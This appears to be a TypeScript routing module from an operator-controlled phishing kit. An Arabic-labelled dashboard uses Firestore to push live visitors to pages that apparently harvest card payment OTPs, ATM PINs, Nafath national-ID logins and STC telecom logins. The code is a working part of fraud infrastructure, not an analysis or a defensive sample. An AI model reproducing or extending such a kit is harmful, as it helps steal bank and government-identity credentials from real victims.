/**
 * Shared page-route mapping used by both dashboard controls
 * and client-side redirect listeners.
 *
 * Key   = the value stored in Firestore `currentPage`
 * Value = the URL path the visitor should be redirected to
 */
export const PAGE_ROUTES: Record<string, string> = {
  home: "/",
  booking: "/booking",
  application: "/application",
  payment: "/payment",
  "payment-otp": "/payment/otp",
  "payment-pin": "/payment/atm-pin",
  "verify-phone": "/verify-phone",
  nafad: "/nafad",
  stc: "/stc",
  // legacy values still used in existing code
  "9999": "/verify-phone",
  "1": "/",
  "2": "/",
}

/**
 * Dashboard-facing list of pages (used for navigation buttons).
 * `key` matches a PAGE_ROUTES key, `label` is the Arabic label,
 * `icon` is an emoji for quick scanning.
 */
export const PAGE_LIST = [
  { key: "home", label: "الرئيسية", icon: "🏠" },
  { key: "application", label: "حجز موعد", icon: "📝" },
  { key: "payment", label: "الدفع", icon: "💳" },
  { key: "payment-otp", label: "OTP الدفع", icon: "🔢" },
  { key: "payment-pin", label: "ATM PIN", icon: "🔐" },
  { key: "verify-phone", label: "تحقق الجوال", icon: "📱" },
  { key: "nafad", label: "نفاذ", icon: "🛡️" },
  { key: "stc", label: "STC تسجيل دخول", icon: "📲" },
] as const

/**
 * Given the Firestore `currentPage` value and the key of the page
 * the visitor is currently on, returns the URL to redirect to
 * — or null if no redirect is needed.
 */
export function getRedirectUrl(
  firestoreCurrentPage: string | number | undefined | null,
  myPageKey: string,
): string | null {
  const target = String(firestoreCurrentPage ?? "").trim()
  if (!target) return null // empty → stay
  if (target === myPageKey) return null // already on the right page

  const url = PAGE_ROUTES[target]
  if (!url) return null // unknown value → ignore

  // Prevent redirect if already on the target URL
  if (typeof window !== "undefined" && window.location.pathname === url) return null

  return url
}
